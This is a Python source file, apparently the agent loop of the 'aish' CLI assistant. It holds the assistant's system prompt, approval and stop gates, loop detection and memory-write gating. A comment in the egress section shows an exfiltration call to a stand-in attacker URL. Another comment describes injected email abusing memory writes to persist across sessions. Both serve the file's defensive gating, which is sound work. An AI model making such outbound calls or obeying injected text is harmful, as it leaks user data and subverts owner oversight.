"""The agent loop: model proposes tool calls, we execute them (gated), repeat.

The model never executes anything itself — Ollama only returns structured
tool_call requests. _dispatch() is the single execution point, and
run_command cannot be reached there unless the approve() callback returns
the command to run (possibly edited by the user).
"""

import datetime
import getpass
import itertools
import json
import os
import platform
import re
import shlex
import shutil
import stat
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import weakref
from collections.abc import Callable, Mapping
from concurrent.futures import ThreadPoolExecutor
from functools import partial
from pathlib import Path
from typing import Any

import ollama

from . import aliases as alias_map
from . import backends, files, media, rules, skill_import, skills, tool_plugins, tools, web
from .approval import Approved, Blocked, Denied, is_scratch_delete, path_within
from .session import SessionLog

_PLATFORM_NOTES = {
    "darwin": (
        "macOS (BSD userland, zsh — NOT GNU/Linux). BSD tools differ from GNU and "
        "your memorized flags are often the GNU ones. Common traps: `ps` has NO "
        "`--sort` / `-C` / long options — sort with `ps aux -r` (by CPU) or "
        "`ps aux -m` (by memory), or `ps -A -o pid,rss,comm | sort -k2 -rn`; "
        "`sed -i` REQUIRES a backup-suffix argument (`sed -i ''`); `date` uses "
        "`-v`/`-r`, not `-d`; `stat` uses `-f`, not `-c`; `find` lacks some GNU "
        "predicates. When unsure of a flag, call read_docs first."
    ),
    "linux": "Linux (GNU userland). Flag details still vary by distro and version.",
}

SYSTEM_PROMPT_TEMPLATE = """\
You are aish, a CLI agent on {platform_note}

Rules:
1. GROUNDING: before running any command whose flags you are not 100% certain
   of, call read_docs for it first. Never guess flags.
2. If a command fails with a usage or unknown-flag error, call read_docs
   before retrying. If docs come back truncated, call read_docs again with a
   topic (e.g. the flag name) to search the full text.
2b. LEARNING: consult saved knowledge BEFORE your training data — highly
   relevant skills and memories are preloaded into your context each task;
   follow them over your built-in approach (they encode what actually worked
   on THIS machine). A preloaded skill marked TRUNCATED must be loaded in
   full with read_skill (or explicitly waived with a reason) before other
   tools run; if a skill in the index matches but was not preloaded, read
   it FIRST;
   when unsure whether something was solved before, call recall. And capture
   learnings as you go: when the user corrects you, when a skill's
   instructions proved wrong (update THAT skill — append the gotcha with
   edit_file, never create a duplicate), or when a hard-won multi-step
   procedure worked, save it — recall first to find an existing entry, then
   write or update the skill file (the user approves the diff). One-line
   facts, preferences, and corrected commands → remember(). When a memory is
   stale, wrong, or superseded, you MUST prune it: call forget_memory(<slug>)
   to delete it. To consolidate duplicates, remember() the one canonical fact,
   then forget_memory() each redundant slug (e.g. remember 'canonical-fact',
   then forget_memory('old-dupe')). When the user states a standing rule or
   preference that must hold in every future task ('always ask before
   pushing'), remember() it with pinned=true — pinned memories stay in your
   context permanently. A fact with a known end date gets
   expires='YYYY-MM-DD'. If remember answers 'NOT saved — a similar memory
   already exists', UPDATE or forget that entry — force=true only for a
   genuinely different fact.
   Entries are FOUND by their name/description/keywords line, so you MUST
   phrase the description like the tasks it should catch ("Use when the
   user wants to find, buy, or compare a product …"), never as a bare rule
   — generalized to the activity, not an item-by-item list — and give
   keywords (topical words, no generic verbs) in every language the user
   types. If saved knowledge should have applied to a task but was not
   preloaded, that is a defect: repair that entry's description/keywords
   (an improve-recall skill, if present, has the checklist).
2c. TOOLS vs SKILLS: skills TEACH, tools DO. A plugin tool is a validated
   TOOL.md (that you or the user added under ~/.config/aish/tools/ —
   project-scope ./.aish/ discovery is disabled pending a per-directory
   trust mechanism) that you call with structured arguments instead of
   composing a shell command — its JSON args reach the wrapper on stdin, so
   free-text like an email or issue body cannot be mangled by shell quoting.
   PREFER an existing plugin tool over re-composing the raw command it wraps.
   Use create_tool to capture an operation as a tool ONLY when ALL THREE hold:
   it is invoked FREQUENTLY, its arguments are FREE-TEXT/shell-fragile, AND
   reliability matters (mutating or user-facing output); otherwise write a
   skill. create_tool validates the manifest and shows both files (manifest
   first, then wrapper) for your user to approve. To install a skill from a
   git repo or local path, use import_skill — it is untrusted content, so
   aish shows the user every file for approval before anything lands; after
   staging, summarize what the skill and its scripts do so they can review.
2d. RULES are not advice. A message headed "RULES IN FORCE FOR THIS TURN"
   lists constraints aish ENFORCES: a call that violates one is refused
   before it runs, whatever you conclude about it. When you get a refusal
   naming a rule, you MUST do what it says instead — never retry the same
   call or a variant of it. If a rule routes the answer through a tool and
   that tool fails, you MUST say so in plain text before using any other
   source; substituting silently is the one thing rules exist to stop, and
   the gate will keep refusing until you have said it. If you genuinely
   believe the rule should not apply here, say why in text and propose the
   call again — the user is asked after two refusals and can allow it.
   Rules live in ~/.config/aish/rules/ and only the USER writes them: when
   they state a standing rule that must be ENFORCED rather than merely
   remembered ("if I paste only a link, analyse THAT and nothing else"),
   tell them a rule file is where it belongs and offer to draft one for
   their approval — do not save it as a memory and hope.
3. Every command is shown to the user for approval before it runs. The user
   may edit a command before approving; the edited form is what ran. A COMMENT
   the user attaches to a decision changes what you do next, and approve vs
   deny mean opposite things:
   - APPROVE + comment = CONTINUE, but adjust. The original command is NOT run
     as-is; adjust it to what the user asked and propose the ADJUSTED command
     (it is approved again before it runs). Never re-run the original unchanged.
   - DENY + comment = STOP. Your next reply MUST be plain text with NO tool
     call: address the user's concern and wait for them. Do not retry a variant
     or run anything else first.
   A plain deny with no comment: do not retry it — change approach or ask.
4. After running commands, analyze the output and answer concisely.
5. Prefer read-only commands. Never bundle destructive operations
   (rm, mv, overwrite redirects) into a command unless the user explicitly
   asked for that operation.
6. Every command runs in the project directory — there is no persistent cd.
   To run a command elsewhere, chain it in ONE call: `cd <dir> && <command>`
   (the directory reverts when the command ends), or use flags like
   `git -C <dir>` / `make -C <dir>`. Paths outside the project prompt the
   user, who may trust that directory for the rest of the session. Only the
   user can move the project directory itself.
7. WEB: for information not on this machine (current events, releases,
   unfamiliar errors, general facts), call web_search, then read_url the most
   promising result and answer from what the page actually says, citing the
   URL. Search queries and URLs LEAVE THIS MACHINE — never include private
   local data (file contents, key values, personal details) in them.
   read_url only reaches public internet hosts; for a localhost or LAN
   service, propose a curl command instead (it goes through approval).
   If a page comes back bot-blocked (HTTP 403/429/503) or with no readable
   text (JavaScript-only), you may retry ONCE via read_url on
   https://r.jina.ai/<url> — a third-party reader that renders the page;
   never send it a URL containing tokens or other secrets.
   When researching, batch independent lookups: issue several web_search /
   read_url calls in a single reply — they run in parallel, which is much
   faster than one per turn.
7b. IMAGES: when the answer should include a picture — the user asks what
   something looks like, asks for a photo/picture/diagram, or you recommend a
   product worth seeing — you MUST call show_image and paste the markdown line
   it returns. That is the ONLY way a picture displays. NEVER write an
   ![alt](https://…) image link yourself (the UI refuses remote images and it
   renders as a dead link) and NEVER curl an image to a file (unservable, and
   it costs an approval prompt). To find one: web_search the subject, read_url
   a promising page, then pass an image URL from it to show_image. If
   show_image reports a problem, try another source — do not paste the URL
   into your answer anyway.
7c. TOOL RESULTS THAT FAILED OR WERE CUT: a result may carry an
   "[aish: … reported status=…]" note. That means the tool did NOT produce
   what it was asked for, even if it looks like it returned something. You
   MUST tell the user the tool failed BEFORE using any other source, and you
   MUST NOT present material from a substitute source as if it came from the
   one the user named. If a result was truncated it carries a continuation
   key: call read_tool_output(continuation="<key>", page=2) to read the rest.
   That is served from a cache and does NOT re-run the tool. Page through what
   you need, or say plainly what you could not read — never guess at the
   omitted part.{scratch_note}
"""

# Per-session scratch workspace (issue #70). Injected only when a path is
# known, so the static prompt stays byte-identical for callers that render it
# without one. Imperative phrasing on purpose — small local models ignore
# capability-style hints (the "prompt hints must be imperative" convention).
SCRATCH_RULE = """
8. SCRATCH WORKSPACE: {scratch_dir} is your OWN private scratch directory. You
   MUST use it for throwaway files — staging a gh issue or PR body, a commit
   message, an intermediate patch or artifact — instead of writing them into
   the project tree. Creating, editing, AND deleting files inside that
   directory is AUTO-APPROVED (no prompt); the whole directory is deleted
   automatically when the session ends, so never leave anything there you need
   to keep. Writing or deleting ANYWHERE ELSE still requires user approval
   exactly as above — the auto-approval applies ONLY inside this directory."""

DENIED_RESULT = (
    "USER DENIED this command — it was NOT executed. "
    "Do not propose it again; change approach or ask the user."
)

CD_NOT_STICKY = (
    "cd was NOT run: every command executes in the project directory ({cwd}) "
    "— a bare cd does not persist. To run something elsewhere, chain it in "
    "ONE command: cd <dir> && <command> (the directory reverts when the "
    "command ends). Only the user can move the project directory (/cd)."
)

EMPTY_RESPONSE = (
    "(the model returned an empty response — the backend may be overloaded or "
    "still loading; try again)"
)


class ModelUnavailable(RuntimeError):
    """The model call failed after a retry (backend down, overloaded, or OOM)."""


class TaskCancelled(Exception):
    """Raised inside the loop when cancel() interrupts a streaming turn."""


CANCELLED_RESULT = "(task stopped by user — any partial work is above)"
NOT_EXECUTED = "(not executed — the user stopped the task)"

# Loop detection: the exact same tool call returning the exact same output is
# not progress. At WARN repeats the model gets one nudge to change approach;
# at STOP repeats the task ends with a diagnostic wrap-up instead of burning
# the remaining step budget. Legitimate polling (tail on a growing log,
# job-status checks) has changing output, so it never trips this.
LOOP_WARN_REPEATS = 3
LOOP_STOP_REPEATS = 5

# Progress-gated step budget (issue #108). A flat step cap has the wrong shape:
# it kills a task that is still doing useful work while letting a stalled one
# burn the whole budget. Instead the loop measures PROGRESS deterministically —
# a step is progress when at least one of its tool calls yields a
# (tool, args, result) tuple seen for the FIRST time (reusing the `repeats` dict
# the loop detector already maintains; no extra model call, no wall-clock timer).
# A steadily-progressing task may run PAST `max_steps` up to the hard ceiling; a
# task that produces no new result for MAX_STALL_STEPS consecutive steps has
# stalled and stops early. The ceiling is the unconditional cost cap that NOTHING
# exceeds — it derives from `max_steps` (which stays the base budget), so raising
# --max-steps raises the cap while the module floor keeps a sane minimum.
MAX_STALL_STEPS = 8
HARD_STEP_CEILING = 60  # effective cap = max(self.max_steps, HARD_STEP_CEILING)

# Skill-read gate (issue #40): while a preloaded-but-truncated skill is
# unread, other tool calls are refused. Must stay < LOOP_WARN_REPEATS — an
# identical refused call repeats at most GATE_MAX_REFUSALS times before the
# gate lifts and its result changes, so the loop detector never fires on the
# gate itself.
GATE_MAX_REFUSALS = 2

SKILL_GATE_REFUSAL = (
    "NOT EXECUTED — required reading first: the preloaded skill(s) {names} "
    "are truncated in your context. Call read_skill({first!r}) to load the "
    "full playbook, or state explicitly why it does not apply and retry — "
    "the call will then proceed."
)

# Stop gate (issue #81): deny + comment means STOP — the system prompt and the
# feedback note ORDER the model to address the concern in plain text and halt,
# but eager models (Gemini, small local ones) run another tool first anyway.
# This is the hard backstop — while a denial's concern is unaddressed every tool
# call is refused, so feedback is never silently folded into another command. A
# text-only reply lifts it (and ends the task); the step budget bounds a model
# that never replies. Approvals never arm this: they mean continue.
STOP_GATE_REFUSAL = (
    "NOT EXECUTED — the user DENIED your last action with a concern you have "
    "not addressed. Denial means STOP: your NEXT turn must be TEXT ONLY, with "
    "NO tool call — address the user's concern and wait for them. Do not retry "
    "a variant or run anything else."
)

# These four nudges are appended to the conversation as user turns the human
# never typed. The live UI shows nothing for them, so their shared `[aish: `
# opening is what keeps a cold replay from rendering them as blue user bubbles
# (session.synthetic_kind, #171) — a test pins it. Don't drop the prefix.
LOOP_WARNING = (
    "[aish: you have issued this exact tool call {count} times and received "
    "identical output every time — repeating it cannot make progress. Change "
    "your approach; if you have no other approach, stop and explain what is "
    "blocking you.]"
)

STEP_LIMIT_NOTE = (
    "[aish: you have reached the step limit for this task, so no more tool "
    "calls are possible. Assess your work and reply with TEXT ONLY: if the "
    "task is complete, give the final answer now. Otherwise state clearly "
    "(1) what was accomplished, (2) what remains, and (3) the next concrete "
    "step — the user can ask you to continue.]"
)

LOOP_STOP_NOTE = (
    "[aish: stopping this task — the same tool call kept returning identical "
    "output even after a warning, so you are running in circles. Reply with "
    "TEXT ONLY: summarize what you tried, what failed and why you appear "
    "stuck, and what would be needed to make progress.]"
)

STALL_NOTE = (
    "[aish: stopping this task — your recent tool calls stopped producing any "
    "new results (no progress for several steps), so you appear stuck. Reply "
    "with TEXT ONLY: summarize what you accomplished, what remains, and what is "
    "blocking further progress — the user can redirect you or say 'continue'.]"
)

STOPPED_LIMIT = (
    "(stopped: hit the max-steps limit — say 'continue' to keep going, or "
    "raise --max-steps)"
)
STOPPED_STALL = (
    "(stopped: no new progress for several steps — say 'continue' with a hint, "
    "or raise --max-steps)"
)
STOPPED_LOOP = "(stopped: repeating the same tool call with no progress)"
NOT_EXECUTED_LIMIT = "(not executed — the step limit was reached)"


WRITE_DENIED = (
    "USER DENIED this file change — nothing was written. "
    "Do not retry the same change; adjust it or ask the user what they want."
)

# Deny + comment = STOP. The denied action did not run; the model must address
# the user's concern in plain text and then halt (the stop gate blocks tools
# until a text-only turn, which ends the task). Small local models ignore soft
# phrasing (the "Prompt hints must be imperative" convention), so the note
# ORDERS it — MUST + a worked example.
FEEDBACK_NOTE = (
    '\n\n[The user DENIED this and left a COMMENT: "{comment}"\n'
    "Denial means STOP. Your NEXT reply MUST be plain text with NO tool call: "
    "address the user's concern, then wait for them. Do NOT retry a variant or "
    'run anything else first. Example — comment "this could delete real data" → '
    'reply "You\'re right, that would touch real files — I\'ve stopped. Here is '
    'what I would do instead…" and stop.]'
)

# Approve + comment = CONTINUE, but adjust. The original action was HELD (not
# run); the model must adjust it to what the user asked and re-propose, and the
# adjusted action is approved again before it runs — the task keeps going.
HELD_FOR_ADJUSTMENT = (
    'NOT RUN — the user APPROVED this command but attached a COMMENT: "{comment}"\n'
    "Approval means CONTINUE, so proceed — but the original command was NOT run. "
    "Adjust it to what the user asked and propose the ADJUSTED command; it will "
    "be shown for approval again before it runs. Do NOT re-run the original "
    "unchanged."
)

WRITE_HELD_FOR_ADJUSTMENT = (
    'NOT WRITTEN — the user APPROVED this change but attached a COMMENT: "{comment}"\n'
    "Approval means CONTINUE, so proceed — but nothing was written. Adjust the "
    "change to what the user asked and propose the ADJUSTED write; it will be "
    "shown for approval again before it lands. Do NOT re-apply the original "
    "unchanged."
)

TOOL_HELD_FOR_ADJUSTMENT = (
    'NOT RUN — the user APPROVED calling {name} but attached a COMMENT: "{comment}"\n'
    "Approval means CONTINUE, so proceed — but the tool was NOT run. Rework the "
    "arguments to what the user asked and call {name} again; it will be shown "
    "for approval again before it runs. Do NOT re-run the original args unchanged."
)


def _with_feedback(base: str, comment: str) -> str:
    return base + FEEDBACK_NOTE.format(comment=comment) if comment else base


def _gate_outcome(text: str, decision: str) -> tools.ToolOutcome:
    """A refusal, carrying its own verdict (#192, contract §6.13).

    Five refusal constants used to be logged by prefix sniff alone —
    `USER DENIED`, `NOT RUN` and `BLOCKED` all start with none of the sniffed
    prefixes, so a denied, held or blocked call logged **ok: true** with no
    decision at all, while the write path logged `held` / `ok: false`
    correctly. The two halves of the same #81 semantics disagreed in the log,
    and any audit of it — the #185 curation ledger included — counted a held
    mutation as a completed one.

    Built LAST, after any `_with_feedback` concatenation: ToolOutcome is a str
    subclass, so string operations return a plain str and silently drop it.
    """
    return tools.ToolOutcome(
        text,
        status=tools.STATUS_FAILED,
        verdict_by=tools.VERDICT_GATE,
        decision=decision,
    )


def _display_path(path: Path) -> str:
    """A path with $HOME abbreviated to ~ — so a global-config destination
    reads clearly as ~/.config/aish/… rather than a bare absolute path."""
    try:
        return "~/" + str(path.relative_to(Path.home()))
    except ValueError:
        return str(path)


_EXIT_CODE_RE = re.compile(r"\[exit code: (-?\d+)\]\s*$")
_JOB_PID_RE = re.compile(r"pid (\d+)")


def _parse_exit_code(result: str) -> int | None:
    """The trailing exit code tools.run_command appends, or None when the
    command never started (a bare 'ERROR: failed to start …')."""
    match = _EXIT_CODE_RE.search(result)
    return int(match.group(1)) if match else None


def _parse_job_id(result: str) -> str:
    """The pid from a background/detach handle message, for the block label."""
    match = _JOB_PID_RE.search(result)
    return match.group(1) if match else ""

READ_DENIED = (
    "USER DENIED reading this sensitive file — its contents were NOT read. "
    "Do not retry; proceed without it or ask the user."
)

BLOCKED_RESULT = (
    "BLOCKED by the safety denylist ({reason}) — NOT executed, and it cannot "
    "be approved through you at all. If the user truly intends this, they must "
    "run it themselves with the ! prefix. Propose a safer alternative if one exists."
)

# The per-task nudge that makes small local models actually consult skills:
# recency is what they obey, so the reminder is (re)inserted directly before
# each user message instead of relying on the system prompt alone. It is
# appended to self.messages directly (never via _append) so it stays out of
# the session log and the web transcript, and the previous task's copy is
# removed first so exactly one exists in history.
TASK_REMINDER_MARK = "<system-reminder>"
TASK_REMINDER = (
    "<system-reminder>Before acting: scan the Skills index in your system "
    "prompt. If a skill matches this task, your FIRST action MUST be "
    "read_skill(<name>) — do not improvise the task from your training "
    "data. Skills (and the saved Memory facts in your context) override "
    "what you think you know.</system-reminder>"
)

# When pre-flight retrieval finds matching knowledge (skills.preflight), the
# reminder slot carries the content itself instead of a nudge to go look for
# it. Shares TASK_REMINDER_MARK so the strip-previous logic treats both alike.
PRELOAD_REMINDER = (
    "<system-reminder>Saved knowledge relevant to this task, preloaded for "
    "you — follow it over your training data:\n\n{knowledge}\n\n"
    "If a block above is marked TRUNCATED you MUST read_skill it in full, "
    "or state why it does not apply, before doing anything else. Also scan "
    "the Skills index in your system prompt for other "
    "matches.</system-reminder>"
)


# The seeded half of "prose explains, gate enforces" (#191). It rides the SAME
# per-task system message as the time note and preloaded knowledge, so it is
# replaced every turn by the strip-previous logic instead of accumulating — a rule
# that bound three turns ago must not still be claiming to govern this one.
RULES_REMINDER = "<system-reminder>{rules}</system-reminder>"


def task_reminder(index: str, preload_text: str = "", rules_text: str = "") -> str:
    """The per-task system reminder: always the current local time (issue #36
    — it lives here, not in the system prompt, so messages[0] stays
    byte-stable for prompt caching and the time is fresh every task), plus
    the preloaded knowledge when pre-flight retrieval found any (issue #40),
    else the skills nudge whenever any skills/memory are advertised — and the
    rules in force for this turn (#191), which are not knowledge to consult but
    constraints the harness will enforce whatever the model concludes."""
    now = datetime.datetime.now().astimezone().isoformat(timespec="seconds")
    time_note = f"{TASK_REMINDER_MARK}Current local time: {now}</system-reminder>"
    if rules_text:
        time_note += "\n" + RULES_REMINDER.format(rules=rules_text)
    if preload_text:
        return f"{time_note}\n{PRELOAD_REMINDER.format(knowledge=preload_text)}"
    return f"{time_note}\n{TASK_REMINDER}" if index else time_note


# /learn — the user-triggered distillation pass. Runs as a normal task, so
# recall/read/diff-approval all apply; shared by the CLI and the web server.
LEARN_PROMPT = (
    "Review this conversation for durable learnings{hint}. For each one: "
    "call recall first to check for an existing skill or memory entry — if "
    "one exists, UPDATE it (edit_file: append the gotcha or correct it) "
    "instead of creating a duplicate. If recall surfaces stale or duplicate "
    "memory, consolidate it: remember() the one canonical fact, then "
    "forget_memory() each redundant slug. Save multi-step procedures as skills — "
    "a markdown file in ~/.config/aish/skills/ (project-scope ./.aish/skills/ "
    "is disabled and would not be read) "
    "with a trigger-phrased description ('Use when the "
    "user asks to …'); save one-line facts and preferences with remember(). "
    "Entries are retrieved by matching their name/description/keywords "
    "against future tasks: phrase every description like the tasks it must "
    "catch (the activity and its task shapes, generalized — no item-by-item "
    "lists; the rule after the trigger), and give keywords — topical nouns "
    "and synonyms, no generic verbs — in every language the user types. If "
    "this conversation shows saved knowledge that failed to trigger when it "
    "should have, repair that entry's description/keywords too. "
    "Then report what you saved and what you skipped and why. If nothing is "
    "worth saving, say so plainly."
)

LEARN_LESSONS_PROMPT = (
    "Migrate the legacy lessons file into structured knowledge — a conscious "
    "review, not a mechanical copy. Read {path}, group related lines, and "
    "flag obsolete ones to drop. For each keeper: recall first and UPDATE an "
    "existing entry if one matches; otherwise save procedure-shaped lessons "
    "as skills (trigger-phrased description) and fact-shaped ones with "
    "remember(). Then list what was migrated and what was dropped, and ask "
    "the user to confirm; once they confirm coverage, rename the file to "
    "lessons.md.bak with a shell command so it stops being loaded."
)


def learn_prompt(hint: str, lessons_path=None) -> str:
    if hint.strip().casefold() == "lessons" and lessons_path:
        return LEARN_LESSONS_PROMPT.format(path=lessons_path)
    clause = f", with attention to: {hint.strip()}" if hint.strip() else ""
    return LEARN_PROMPT.format(hint=clause)


# /feedback (CLI and web) expands to one of these so both entry points share
# the flow. It leans on the `gh_issue` skill for repo context rather than a
# permanent feedback skill, so nothing is added to the always-on skill index.
#
# Two flavours (issue #110):
#  - BLOCK flow (web, text-only feedback): the model emits the finished issue as
#    ONE `aish-issue` fenced block and does NOT run `gh issue create`. The block
#    is the single source of truth — the frontend renders it as a review card and
#    the backend creates it verbatim on the user's confirm (a user-direct action,
#    no approval gate, repo pinned). This drops the redundant second prompt.
#  - CLASSIC flow (CLI, and web feedback that carries attachments): the model
#    drafts the issue and runs `gh issue create` itself through the approval gate,
#    because it also has to upload the attached assets — a step the text-only
#    backend path does not handle. The approval gate is the safety boundary here.
#
# Attachments (#130): assets are published to a PUBLIC GitHub release, so
# consent is explicit — the draft lists every attached file with a per-file
# exclude chip, and only the files still listed when the user approves are
# uploaded (FEEDBACK_ASSETS_RULES). A block-flow feedback that gains
# attachments while the draft is being adjusted auto-switches to the classic
# flow via FEEDBACK_SWITCH_NOTE (appended server-side, model-only).
FEEDBACK_INTRO = (
    "The user wants to send feedback about aish — a bug report, a feature "
    "request, or an improvement idea — that will become a GitHub issue on the "
    "`epnasis/aish` repository (checked out at /Users/epnasis/dev/aish). "
    "You MUST follow this flow:\n"
    "1. Read the `gh_issue` skill (read_skill) for repo context and labels.\n"
    "2. If the request is unclear or thin, ask focused clarifying questions "
    "FIRST — one short round, not an interrogation. If they already described "
    "it{clause}, go straight to a draft.\n"
)
FEEDBACK_BLOCK_PROMPT = FEEDBACK_INTRO + (
    "3. Emit the finished issue as EXACTLY ONE fenced block, and nothing that "
    "duplicates it (no separate rendered copy, no `gh issue create`, no "
    "quick-reply chips). The block is the ONLY thing the user reviews and the "
    "EXACT text that gets filed:\n"
    "```aish-issue\n"
    "title: A concise one-line title\n"
    "---\n"
    "Body markdown here.\n"
    "Multiple lines, sections, a suggested label, etc.\n"
    "```\n"
    "The FIRST line inside the block MUST be `title: <one-line title>`; the `---` "
    "separator line is optional; everything after it is the issue body, verbatim.\n"
    "4. Do NOT run `gh issue create` — the user files it with one tap and aish "
    "creates it for them. Stop after the block; do not add chips or a trailing "
    "question."
)
FEEDBACK_CLASSIC_PROMPT = FEEDBACK_INTRO + (
    "3. Present the draft issue as ordinary rendered markdown — a bold title "
    "line and a structured body. Do NOT wrap the draft in a code block; the "
    "user reads it rendered.\n"
    "4. End that same message with exactly these two quick-reply chips, each on "
    "its own line:\n"
    "[Create the issue](aish-reply://Create the issue)\n"
    "[Edit — change something](aish-reply://I'd like to change the draft: )\n"
    "5. Run `gh issue create` ONLY after the user approves. Then show the new "
    "issue's URL."
)

# Consent for feedback attachments (#130): issue assets land on a PUBLIC GitHub
# release, so nothing is uploaded silently — the draft itself lists every
# detected file with a per-file exclude chip, and only what survives review is
# uploaded. Appended to the classic prompt when the feedback carries
# attachments, and embedded in the block→classic switch note.
FEEDBACK_ASSETS_RULES = (
    "Attachment rules — issue assets are uploaded to a PUBLIC GitHub release, "
    "so the user must see and confirm exactly what gets published:\n"
    "- The draft MUST end with an **Attachments** section listing every "
    "attached file (including any the user attaches in later turns while "
    "adjusting the draft), one per line, each with its own exclude chip:\n"
    "[Exclude <name>](aish-reply://Exclude <name> from the issue)\n"
    "- If the user excludes a file, re-present the draft without it; an "
    "excluded file is NEVER uploaded.\n"
    "- Upload ONLY the files still listed when the user approves the draft, "
    "per the `gh_issue` skill's asset workflow, and link them in the issue "
    "body."
)

# Auto-switch (#130): a text-only feedback (block flow) that gains attachments
# while the draft is being adjusted moves to the upload-capable classic flow —
# the aish-issue block cannot carry assets. The server appends this to the
# follow-up turn's text (model-only; the user's echo stays clean) and withdraws
# the stashed block draft at the same time.
FEEDBACK_SWITCH_NOTE = (
    "\n\n[The user attached files to this feedback. The aish-issue block flow "
    "cannot upload them, so the block draft is WITHDRAWN — SWITCH to the "
    "classic flow NOW and do not emit an aish-issue block again:\n"
    "- Re-present the updated draft as ordinary rendered markdown — a bold "
    "title line and a structured body, NOT in a code block.\n"
    "- End that same message with exactly these two quick-reply chips, each on "
    "its own line:\n"
    "[Create the issue](aish-reply://Create the issue)\n"
    "[Edit — change something](aish-reply://I'd like to change the draft: )\n"
    "- Run `gh issue create` ONLY after the user approves, then show the new "
    "issue's URL.\n" + FEEDBACK_ASSETS_RULES + "]"
)


def feedback_prompt(hint: str = "", block_flow: bool = False, attachments: bool = False) -> str:
    """The /feedback expansion. block_flow=True selects the web text-only path
    (emit an `aish-issue` block, backend files it); the default classic path has
    the model run `gh issue create` through the approval gate (CLI, or web
    feedback with attachments that need the asset-upload workflow). attachments
    appends the public-upload consent rules (#130): list the assets in the
    draft with per-file exclude chips, upload only what survives review."""
    hint = hint.strip()
    clause = f" (their words: {hint})" if hint else ""
    template = FEEDBACK_BLOCK_PROMPT if block_flow else FEEDBACK_CLASSIC_PROMPT
    prompt = template.format(clause=clause)
    if attachments and not block_flow:
        prompt += (
            "\nThe user attached logs, screenshots, or files — incorporate "
            "them into the issue.\n" + FEEDBACK_ASSETS_RULES
        )
    return prompt


# No side effects and no approval prompt — safe to run concurrently.
# show_image belongs here despite writing a file: the only thing it can write is
# an image into aish's OWN media store, never user state — the same reason
# writing in the scratch workspace needs no approval. Content-addressed writes
# make it thread-safe.
READ_ONLY_TOOLS = frozenset(
    {
        "read_docs",
        "read_skill",
        "web_search",
        "read_url",
        "read_file",
        "recall",
        "show_image",
        # Reads aish's OWN content-addressed output cache — no host, no user
        # state, no wrapper re-run (#192). Read-only by the same argument as
        # show_image's write into the media store.
        "read_tool_output",
    }
)

# Origin-gated egress (#178 P0-2): read-only for the local machine, but their
# INPUTS leave it — a read_url("https://attacker/?d=<data>") is an outbound
# send. In a non-user (triggered) session, a call reaching a host the owner
# never introduced holds on an approval card instead of auto-running; in a
# user session (all CLI sessions, every hand-started web chat) nothing changes.
# show_image is here too: its URL form is an outbound GET at a host the model
# chose, which is exactly what this gate exists for. Its local-path form reaches
# no host and is never gated (see _egress_novel_hosts).
EGRESS_TOOLS = frozenset({"web_search", "read_url", "show_image"})

# URL or bare-domain-looking tokens in owner text. Deliberately generous
# (matches "setup.py"-shaped tokens too): over-inclusion only ever widens
# provenance with strings the owner literally typed, while under-inclusion
# would nag about a host the owner plainly named.
_HOST_TOKEN_RE = re.compile(
    r"(?i)(?:https?://([^\s/\"'<>]+)|\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,})\b)"
)

SHOW_IMAGE_NO_CURL = (
    "Do NOT fall back to curl or wget — a file fetched that way cannot be "
    "displayed. Try show_image with a different source, or tell the user you "
    "could not find a usable picture."
)

EGRESS_DENIED = (
    "USER DENIED this outbound call — it was NOT executed. "
    "Do not retry it; change approach or ask the user."
)

EGRESS_NO_APPROVER = (
    "NOT EXECUTED: this automated session cannot reach {host} — the host was "
    "not mentioned by the owner and no approver is available. Work with hosts "
    "the owner named, or finish and report."
)

# Origin-gated knowledge writes (#196). remember/forget_memory auto-approve, and
# that is deliberate: capturing a fact must stay frictionless. The reasoning is
# attended-only, though — unattended, the text proposing the write can be an
# injected email, and a memory persists into EVERY future session and is
# retrieved by preflight, so the same capability becomes a persistence primitive
# reachable from untrusted input. Deletion is prohibited outright; saving holds
# on the approve_tool card so the owner sees what is being written.
KNOWLEDGE_WRITE_TOOLS = frozenset({"remember", "forget_memory"})

# Rendered steps that carry turn identity (docs/trace-contract.md §2, design
# fork 1 = option b): the smallest set that makes a governance join complete —
# an answer always needs the tool steps and the knowledge step alongside the
# gate records. `thinking` is deliberately left out: it is the high-volume kind
# and buys nothing #197 asks for. Renderless kinds are stamped by _emit_record.
TURN_STAMPED_STEPS = frozenset({"tool_start", "tool", "knowledge"})

# Decisions meaning THE ACTION DID NOT HAPPEN. A step carrying one is never
# green, whichever path set it — see _emit_tool_step for why this is one rule
# rather than a fix at each of the (now ten) refusal sites.
REFUSED_DECISIONS = frozenset({"denied", "held", "blocked", "rejected"})

FORGET_PROHIBITED = (
    "NOT EXECUTED: forget_memory is unavailable in an automated session — "
    "deleting the owner's knowledge with nobody watching is never the right "
    "call, whatever the entry says. Instead, name {slug} in your report/summary "
    "with the reason it should go; the owner retires it in an attended session. "
    "Do NOT retry this call."
)

REMEMBER_DENIED = (
    "USER DENIED saving this memory — NOTHING was written. Do not retry it; "
    "state the fact in your report instead and let the owner decide."
)

REMEMBER_NO_APPROVER = (
    "NOT EXECUTED: this automated session cannot write to memory — a knowledge "
    "write needs the owner's review and no approver is available. State the "
    "fact in your report instead; the owner can save it."
)


def _hosts_in_text(text: str) -> set[str]:
    """Lowercased hostnames mentioned in owner-authored text (full URLs or
    bare domain-looking tokens)."""
    hosts: set[str] = set()
    for url_host, bare in _HOST_TOKEN_RE.findall(text or ""):
        token = (url_host or bare).lower()
        # A URL netloc may carry userinfo/port — keep only the host part.
        token = token.rsplit("@", 1)[-1].split(":", 1)[0].strip(".")
        if token:
            hosts.add(token)
    return hosts


def format_secs(seconds: float) -> str:
    if seconds < 60:
        return f"{seconds:.1f}s"
    minutes, secs = divmod(int(seconds), 60)
    return f"{minutes}m{secs:02d}s"


def format_tokens(count: int) -> str:
    return f"{count / 1000:.1f}k" if count >= 1000 else str(count)


def _usage(response: Any) -> tuple[int, int]:
    """(prompt tokens, completion tokens) as Ollama reports them; zeros when
    absent. Note prompt_eval_count skips KV-cache-reused prefix tokens."""
    return (
        getattr(response, "prompt_eval_count", 0) or 0,
        getattr(response, "eval_count", 0) or 0,
    )


def _tokens_note(usage: tuple[int, int]) -> str:
    """' · ↑ 3.2k ↓ 96 tokens' — ↑ fed to the model, ↓ generated by it."""
    tokens_in, tokens_out = usage
    if not (tokens_in or tokens_out):
        return ""
    return f" · ↑ {format_tokens(tokens_in)} ↓ {format_tokens(tokens_out)} tokens"


class _NoStatus:
